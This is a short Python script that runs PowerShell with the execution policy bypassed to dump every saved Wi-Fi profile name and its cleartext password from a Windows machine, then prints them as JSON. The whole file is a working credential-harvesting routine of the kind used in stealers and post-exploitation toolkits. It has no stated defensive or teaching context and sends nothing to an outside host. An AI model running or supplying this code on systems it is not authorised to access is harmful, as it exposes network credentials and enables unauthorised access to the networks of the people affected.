import subprocess
import json

def dump_wifi_passwords():
    powershell_command = r'(netsh wlan show profiles) | Select-String "\:(.+)$" | % {$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | % {[PSCustomObject]@{ PROFILE=$name;PASS=$pass }} | Format-Table -AutoSize'

    result = subprocess.run(['powershell.exe', '-ExecutionPolicy', 'ByPass','-Command', powershell_command], capture_output=True, text=True)

    if result.returncode == 0:
        lines = result.stdout.split('\n')
        wifi_list = []
        for line in lines:
            if line.strip().startswith('-------'):
                continue
            elif line.strip().startswith('PROFILE'):
                continue
            elif line.strip() == '':
                continue
            else:
                parts = line.split()
                if len(parts) == 2:
                    wifi_name = parts[0]
                    wifi_password = parts[1]
                    wifi_list.append({'wifi_name': wifi_name, 'wifi_password': wifi_password})
                if len(parts) > 2:
                    wifi_name = ' '.join(parts[:-1])
                    wifi_password = parts[-1]
                    wifi_list.append({'wifi_name': wifi_name, 'wifi_password': wifi_password})

        return json.dumps({"status": "success", "wifi_list": wifi_list}, indent=4)
    else:
        return json.dumps({"status": "error", "message": "Failed to dump wifi passwords"}, indent=4)

dumped = dump_wifi_passwords()
print(dumped)
